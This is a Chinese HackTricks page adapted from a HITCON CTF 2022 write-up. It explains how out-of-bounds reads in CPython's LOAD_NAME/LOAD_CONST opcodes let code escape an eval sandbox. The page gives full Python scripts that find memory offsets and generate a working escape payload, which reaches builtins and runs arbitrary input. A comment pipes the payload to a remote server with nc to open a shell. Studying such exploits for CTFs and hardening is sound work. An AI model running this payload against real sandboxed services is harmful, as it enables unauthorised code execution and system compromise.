# LOAD_NAME / LOAD_CONST opcode OOB 读取

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** 上关注我们**。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

**此信息来源于** [**此篇文章**](https://blog.splitline.tw/hitcon-ctf-2022/)**。**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

我们可以利用 LOAD_NAME / LOAD_CONST 操作码中的 OOB 读取功能来获取内存中的某些符号。这意味着可以使用类似 `(a, b, c, ... 数百个符号 ..., __getattribute__) if [] else [].__getattribute__(...)` 的技巧来获取您想要的符号（如函数名）。

然后只需精心制作您的利用程序。

### 概述 <a href="#overview-1" id="overview-1"></a>

源代码非常简短，仅包含 4 行！
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
您可以输入任意Python代码，它将被编译为[Python代码对象](https://docs.python.org/3/c-api/code.html)。但是在评估该代码对象之前，该代码对象的`co_consts`和`co_names`将被替换为一个空元组。

因此，在这种情况下，所有包含常量（例如数字、字符串等）或名称（例如变量、函数）的表达式最终可能导致段错误。

### 越界读取 <a href="#out-of-bound-read" id="out-of-bound-read"></a>

段错误是如何发生的？

让我们从一个简单的例子开始，`[a, b, c]`可以编译成以下字节码。
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
但如果`co_names`变成空元组会怎么样？`LOAD_NAME 2`操作码仍然会被执行，并尝试从原本应该在的内存地址读取值。是的，这是一种越界读取的“特性”。

解决方案的核心概念很简单。CPython中的一些操作码，例如`LOAD_NAME`和`LOAD_CONST`，对越界读取存在漏洞。

它们从`consts`或`names`元组中的索引`oparg`中检索对象（这就是`co_consts`和`co_names`在底层的名称）。我们可以参考关于`LOAD_CONST`的以下简短片段，了解CPython在处理到`LOAD_CONST`操作码时的操作。
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
通过这种方式，我们可以使用OOB功能从任意内存偏移获取一个“name”。要确保它的名称和偏移量是什么，只需不断尝试`LOAD_NAME 0`，`LOAD_NAME 1` ... `LOAD_NAME 99` ... 您可能会发现大约在oparg > 700时会找到一些内容。当然，您也可以尝试使用gdb查看内存布局，但我认为这样做可能不会更容易？

### 生成利用 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

一旦我们检索到那些有用的名称/常量偏移，我们如何从该偏移获取一个名称/常量并使用它呢？这里有一个技巧：\
假设我们可以从偏移5（`LOAD_NAME 5`）中获取一个`__getattribute__`名称，且`co_names=()`，然后只需执行以下操作：
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> 注意，不必将其命名为`__getattribute__`，您可以将其命名为更短或更奇怪的名称

您可以通过查看其字节码来理解其背后的原因：
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
注意`LOAD_ATTR`也从`co_names`中检索名称。如果名称相同，Python会从相同的偏移量加载名称，因此第二个`__getattribute__`仍然从偏移量=5加载。利用这个特性，我们可以在内存附近使用任意名称。

对于生成数字应该是微不足道的：

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### 利用脚本 <a href="#exploit-script-1" id="exploit-script-1"></a>

由于长度限制，我没有使用常量。

首先，这里是一个用于查找这些名称偏移量的脚本。
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
以下内容用于生成真正的Python利用。
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
它基本上执行以下操作，对于我们从`__dir__`方法中获取的字符串：
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索我们的独家[**NFTs**]收藏品，[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
